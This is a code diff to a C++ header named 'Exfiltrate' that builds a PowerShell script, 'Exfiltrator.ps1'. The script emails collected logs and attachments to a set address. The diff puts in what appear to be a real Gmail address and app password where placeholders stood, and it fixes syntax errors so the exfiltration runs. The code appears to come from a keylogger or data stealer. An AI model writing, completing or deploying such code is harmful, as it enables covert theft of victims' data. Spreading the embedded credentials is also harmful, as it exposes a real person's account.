@@ -13,9 +13,9 @@
 namespace Exfiltrate
 {
 	#define SCRIPT_NAME "Exfiltrator.ps1"
-	#define ORIGIN "test@temp.com"
-	#define DESTINATATION "test@temp.com"
-	#define PASSWORD "test_password"
+	#define ORIGIN "abdullahansari1618@gmail.com" 
+	#define DESTINATATION "abdullahansari1618@gmail.com"
+	#define PASSWORD "kywszmmfscebhngb"
 
 	const std::string &exfiltratorScript =
 
@@ -53,12 +53,12 @@ namespace Exfiltrate
 		"\t\t\t$mailClient.Credentials = New-Object System.Net.NetworkCredential($sender.Split(\"@\")[0], $password);\r\n"
 		"\t\t\t$mailClient.Send($message);\r\n\r\n"
 		"\t\t\t#Finally we destroy the client as well as our credential\r\n\r\n"
-		"\t\t\tRemove-Variable - name mailClient;\r\n"
-		"\t\t\tRemove-Variable - name password;\r\n\r\n"
+		"\t\t\tRemove-Variable -name mailClient;\r\n"
+		"\t\t\tRemove-Variable -name password;\r\n\r\n"
 		"\t\t\texit 7;\r\n\r\n"
 		"\t\t}\r\n\t}\r\n"
 		"\tcatch\r\n\t{\r\n"
-		"\t\texit 3;\r\n\t}"
+		"\t\texit 3;\r\n\t}\r\n\r\n}"
 		"\r\n\r\ntry\r\n{\r\n"
 		"\texfilLogs -sender \"" + std::string(ORIGIN) + "\" -recepient \"" + std::string(DESTINATATION) +  "\" -subject $subject -body $body -attachment $attachment -password \"" + std::string(PASSWORD) + "\";\r\n"
 		"}\r\ncatch\r\n{\r\n\texit 4;\r\n}";
